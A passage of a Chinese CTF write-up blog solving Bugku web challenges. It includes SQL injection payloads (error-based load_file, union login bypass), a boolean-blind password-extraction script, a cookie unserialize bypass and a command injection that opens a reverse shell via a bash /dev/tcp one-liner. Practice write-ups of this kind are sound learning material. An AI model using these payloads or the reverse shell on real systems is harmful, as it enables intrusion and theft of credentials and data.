action=&quot;#&quot;&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt; </span><br><span class="line">  &lt;/form&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">&#125; </span><br><span class="line">$KEY=&apos;ISecer:www.isecer.com&apos;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>分析一下这段代码，中间得到flag的代码是当<code>unserialize($cookie)</code>等于<code>$key</code>时，<br>但是key是在后面定义的，所以前面那个key是空的，我们可以在本地试试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = &apos;s:0:&quot;&quot;;&apos;;</span><br><span class="line">if(unserialize($str) === &quot;$hh&quot;)&#123;</span><br><span class="line"></span><br><span class="line">	echo 1;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以发现是会回显1的，所以一样的道理，在请求头中添加:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:ISecer=s:0:&quot;&quot;;</span><br></pre></td></tr></table></figure></p>
<p>即可得到flag</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/71757553.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<h2 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h2><p>说是sql注入，但是各种方法都试了，找了网上的writeup才发现是<code>.DS_Store</code>泄露，<br>什么是.DS_Store:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store 是 Mac OS X 系统中的临时文件，其中可能存放与目录相关的敏感信息。</span><br></pre></td></tr></table></figure></p>
<p>在网上找一个<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">.DS_Store利用工具</a></p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-29/17587421.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>直接就把flag文件下载下来了，打开即可拿到flag</p>
<h2 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客"></a>孙xx的博客</h2><p>这题貌似也坏了</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>题目给出提示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">访问参数为：?id=x</span><br><span class="line"></span><br><span class="line">不允许包含“--”，空格，单引号，双引号，“union”关键字</span><br><span class="line">查询文件中包含“”（双引号）里面的内容，需要查询的文件路径为：/var/test/key_1.php</span><br></pre></td></tr></table></figure></p>
<p>需要查询的是一个文件，这里使用mysql的<code>load_file</code>这个函数,<br>题目很明显直接提示了是报错注入，先试试updatexml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10088/?id=1/**/and/**/updatexml(1,concat(0x7e,(select/**/@@version),0x7e),1)</span><br></pre></td></tr></table></figure></p>
<p>可以直接报错了，所以接下来使用<code>load_file</code>这个函数，因为substr的长度只有30位，<br>而且加载的是一个文件，所以需要多试试:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10088/?id=1/**/and/**/updatexml(1,concat(0x7e,substr(load_file(0x2f7661722f746573742f6b65795f312e706870),75,100),0x7e),1)</span><br></pre></td></tr></table></figure></p>
<p>大概就是75到125的位置得到的flag，但是提交的时候是中文的双引号，这个地方有点坑</p>
<h2 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h2><p>直接扫后台得到<code>show.php</code>，本来以为是一个代码审计，但是直接给出了flag..</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9002/show.php</span><br></pre></td></tr></table></figure>
<h2 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h2><p>首先拿到题目看了看源码没给提示，直接抓个包，在响应包中可以看到tip:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JHNxbD0iU0VMRUNUIHVzZXJuYW1lLHBhc3N3b3JkIEZST00gYWRtaW4gV0hFUkUgdXNlcm5hbWU9JyIuJHVzZXJuYW1lLiInIjsKaWYgKCFlbXB0eSgkcm93KSAmJiAkcm93WydwYXNzd29yZCddPT09bWQ1KCRwYXNzd29yZCkpewp9</span><br></pre></td></tr></table></figure>
<p>base64解码之后是:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT username,password FROM admin WHERE username=&apos;&quot;.$username.&quot;&apos;&quot;;</span><br><span class="line">if (!empty($row) &amp;&amp; $row[&apos;password&apos;]===md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到是先提交的用户名之后再从数据中查询密码，随后再核对密码，然后也没有对username进行过滤的操作，<br>此时构造语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&apos; union select md5(1),md5(1) #</span><br></pre></td></tr></table></figure></p>
<p>理解起来很简单，就是先闭合前面的<code>单引号</code>，使得前面为空，然后联合查询出<code>md5(1)</code>，<br>随后将password置为1，就能绕过了</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-26/40985088.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>进来之后是一个进程监测系统，随便输了几个字符：</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-26/44783462.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>发现了<code>sh -c ps -aux | grep</code>,能执行命令，所以很简单，弹个shell就行<br>直接bash弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|bash -i &gt;&amp; /dev/tcp/服务器ip/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
<p>拿到shell 之后 cat f*</p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-26/84561059.jpg" alt="" title="" class="">
                <p></p>
            </figure>
<p>拿到flag</p>
<h2 id="login3-SKCTF"><a href="#login3-SKCTF" class="headerlink" title="login3(SKCTF)"></a>login3(SKCTF)</h2><p>题目先给了提示，基于布尔的SQL盲注，经过测试之后可以发现是有<code>admin</code>这个账户的，<br>除开提示密码错误，然后还提示用户不存在，<br>上脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">str_all=&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ &#123;&#125;+-*/=&quot;</span><br><span class="line">url=&quot;http://118.89.219.210:49167/index.php&quot;</span><br><span class="line">r=requests.session()</span><br><span class="line"></span><br><span class="line">def password():</span><br><span class="line">    resutlt=&quot;&quot;</span><br><span class="line">    for i in range(40):</span><br><span class="line">        fla=0</span><br><span class="line">        for j in range(32,127):</span><br><span class="line">            playlod = &quot;admin&apos;^(ascii(mid((select(password)from(admin))from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#&quot;.format(str(i+1),str(j))</span><br><span class="line">            data = &#123;</span><br><span class="line">                &quot;username&quot;: playlod,</span><br><span class="line">                &quot;password&quot;: &quot;123&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            s=r.post(url,data)</span><br><span class="line">            if &quot;error&quot; in s.text:</span><br><span class="line">                resutlt+=chr(j)</span><br><span class="line">                fla=1</span><br><span class="line">                print(&apos;**************************&apos;,resutlt)</span><br><span class="line">        if fla==0:</span><br><span class="line">            break</span><br><span class="line">password()</span><br></pre></td></tr></table></figure>
<p>然后得到一串md5，解密得到flag{skctf123456}</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>扫二维码关注bugku<br>然后发送flag就行</p>
<h1 id="WEB进阶"><a href="#WEB进阶" class="headerlink" title="WEB进阶"></a>WEB进阶</h1><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1>
        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2018-08-26T09:02:27.737Z" itemprop="dateUpdated">2018-08-26 17:02:27</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/2018/06/06/bugku/" target="_blank" rel="external">http://yoursite.com/2018/06/06/bugku/</a>
        
    </div>
    <footer>
        <a href="http://yoursite.com">
            <img src="/img/avatar.jpg" alt="">
            
        </a>
    </footer>
</blockquote>

        
        <div class="post-footer">
            
            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/06/06/bugku/&title=《bugku writeup(杂项、Web）》 — CherryGk's Blog&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/06/06/bugku/&title=《bugku writeup(杂项、Web）》 — CherryGk's Blog&source=" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/06/06/bugku/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《bugku writeup(杂项、Web）》 — CherryGk's Blog&url=http://yoursite.com/2018/06/06/bugku/&via=http://yoursite.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2018/06/06/bugku/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            
    <div id="comment"></div>



        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/2018/06/24/kali-google/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Kali Linux中如何安装Google Chrome并安装插件</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/2018/05/31/logindft/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">“百度杯”CTF比赛 登陆 writeup</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web"><span class="post-toc-number">1.</span> <span class="post-toc-text">Web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web2"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">web2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#文件上传测试"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">文件上传测试</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#计算器"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">计算器</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web基础-GET"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">web基础$_GET</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web基础-POST"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">web基础$_POST</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#矛盾"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">矛盾</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web3"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">web3</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sql注入"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">sql注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#域名解析"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">域名解析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#SQL注入1"><span class="post-toc-number">1.10.</span> <span class="post-toc-text">SQL注入1</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#你必须让他停下"><span class="post-toc-number">1.11.</span> <span class="post-toc-text">你必须让他停下</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#本地包含"><span class="post-toc-number">1.12.</span> <span class="post-toc-text">本地包含</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#变量1"><span class="post-toc-number">1.13.</span> <span class="post-toc-text">变量1</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web5"><span class="post-toc-number">1.14.</span> <span class="post-toc-text">web5</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#头等舱"><span class="post-toc-number">1.15.</span> <span class="post-toc-text">头等舱</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#网站被黑"><span class="post-toc-number">1.16.</span> <span class="post-toc-text">网站被黑</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web4"><span class="post-toc-number">1.17.</span> <span class="post-toc-text">web4</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#flag在index里"><span class="post-toc-number">1.18.</span> <span class="post-toc-text">flag在index里</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#输入密码查看flag"><span class="post-toc-number">1.19.</span> <span class="post-toc-text">输入密码查看flag</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#点击一百万次"><span class="post-toc-number">1.20.</span> <span class="post-toc-text">点击一百万次</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#备份是个好习惯"><span class="post-toc-number">1.21.</span> <span class="post-toc-text">备份是个好习惯</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#秋名山老司机"><span class="post-toc-number">1.22.</span> <span class="post-toc-text">秋名山老司机</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#速度要快"><span class="post-toc-number">1.23.</span> <span class="post-toc-text">速度要快</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#cookies欺骗"><span class="post-toc-number">1.24.</span> <span class="post-toc-text">cookies欺骗</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#XSS注入"><span class="post-toc-number">1.25.</span> <span class="post-toc-text">XSS注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#never-give-up"><span class="post-toc-number">1.26.</span> <span class="post-toc-text">never give up</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#welcome-to-bugkuctf"><span class="post-toc-number">1.27.</span> <span class="post-toc-text">welcome to bugkuctf</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#过狗一句话"><span class="post-toc-number">1.28.</span> <span class="post-toc-text">过狗一句话</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#字符？正则？"><span class="post-toc-number">1.29.</span> <span class="post-toc-text">字符？正则？</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前女友-SKCTF"><span class="post-toc-number">1.30.</span> <span class="post-toc-text">前女友(SKCTF)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#login1-SKCTF"><span class="post-toc-number">1.31.</span> <span class="post-toc-text">login1(SKCTF)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#你从哪里来"><span class="post-toc-number">1.32.</span> <span class="post-toc-text">你从哪里来</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#md5-collision-NUPT-CTF"><span class="post-toc-number">1.33.</span> <span class="post-toc-text">md5 collision(NUPT_CTF)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#程序员本地网站"><span class="post-toc-number">1.34.</span> <span class="post-toc-text">程序员本地网站</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#各种绕过"><span class="post-toc-number">1.35.</span> <span class="post-toc-text">各种绕过</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web8"><span class="post-toc-number">1.36.</span> <span class="post-toc-text">web8</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#细心"><span class="post-toc-number">1.37.</span> <span class="post-toc-text">细心</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#求getshell"><span class="post-toc-number">1.38.</span> <span class="post-toc-text">求getshell</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#INSERT-INTO注入"><span class="post-toc-number">1.39.</span> <span class="post-toc-text">INSERT INTO注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#这是一个神奇的登陆框"><span class="post-toc-number">1.40.</span> <span class="post-toc-text">这是一个神奇的登陆框</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#多次"><span class="post-toc-number">1.41.</span> <span class="post-toc-text">多次</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#PHP-encrypt-1-ISCCCTF"><span class="post-toc-number">1.42.</span> <span class="post-toc-text">PHP_encrypt_1(ISCCCTF)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#文件包含2"><span class="post-toc-number">1.43.</span> <span class="post-toc-text">文件包含2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#flag-php"><span class="post-toc-number">1.44.</span> <span class="post-toc-text">flag.php</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sql注入2"><span class="post-toc-number">1.45.</span> <span class="post-toc-text">sql注入2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#孙xx的博客"><span class="post-toc-number">1.46.</span> <span class="post-toc-text">孙xx的博客</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#报错注入"><span class="post-toc-number">1.47.</span> <span class="post-toc-text">报错注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Trim的日记本"><span class="post-toc-number">1.48.</span> <span class="post-toc-text">Trim的日记本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#login2-SKCTF"><span class="post-toc-number">1.49.</span> <span class="post-toc-text">login2(SKCTF)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#login3-SKCTF"><span class="post-toc-number">1.50.</span> <span class="post-toc-text">login3(SKCTF)</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Misc"><span class="post-toc-number">2.</span> <span class="post-toc-text">Misc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#签到题"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">签到题</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB进阶"><span class="post-toc-number">3.</span> <span class="post-toc-text">WEB进阶</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#代码审计"><span class="post-toc-number">4.</span> <span class="post-toc-text">代码审计</span></a></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>

</div>

        <footer class="footer">
    
    <div class="bottom">
        <p>
            <span>
                 &copy; 2017 - 2018
            </span>
        		
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/06/06/bugku/&title=《bugku writeup(杂项、Web）》 — CherryGk's Blog&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/06/06/bugku/&title=《bugku writeup(杂项、Web）》 — CherryGk's Blog&source=" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/06/06/bugku/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《bugku writeup(杂项、Web）》 — CherryGk's Blog&url=http://yoursite.com/2018/06/06/bugku/&via=http://yoursite.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2018/06/06/bugku/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABwklEQVR42u3aSY7DMAwEwPz/0xlgroGVJrXYAUonI/FS9oEQl9crXu//dfXL5/HV+jzntWPh4uJOc/MHjK8dU8b3TAy4uLjnuePgNb7FGFelf7Hh4uI+jNsLYfnGCBcX9xe5vXSl9zlwcXGfwK0WMnrJTHK3ZbkaLi7uBLcajHYcb6zv4uLiFrnv4qpud/L0KXo6Li7uEW7SQF2VDiVt2ijM4eLibuYmaUa+QcmTluTfyxCGi4u7mVvFzbdJkvGOPLDi4uLu41aHJKrbmrUDXri4uHdxC5FvGlcd8sDFxd3NXTWsOd/PKXSDcXFxN3N3N1BXFUpwcXHPc2cCU3V71EuxvgQ1XFzcpdxkdDIZlciv7RVEcHFxz3PzpmmvKZu3Z8YpFi4u7hlu4aTWa/Rw5fouLi7uUu7a2Y38PnkBBRcX9y5uXkhtRsrW6AYuLu693HzNj2v0PkFhb4WLizvNrQaUVc2V6kaq/DK4uLjT3GqBY1V3t9d6wcXFPcmtNkXyYsfMANZlfRcXF/cx3GoCU23GREkRLi7uT3GrQxj5+BcuLu5d3F5wqbZpe6WQZlkEFxd3gtsrmFaHMGYSJ1xc3IPcP+iFdp2uyNUmAAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.1"></script>

<script type="text/javascript" src="https://cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.3.1"></script>
<script type="text/javascript" src="/js/blog.js?v=1.3.1"></script>

<!-- third-party -->





<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.1"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



    
        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script type="text/javascript" src="/js/plugins/valine.js?v=1.3.1"></script>
    
    



<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.3.1"></script>



    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>






    <script type="text/javascript">
  daovoice('init', {
    app_id: "c1ada43c"
  });
  daovoice('update');
</script>

    
</body>
</html>
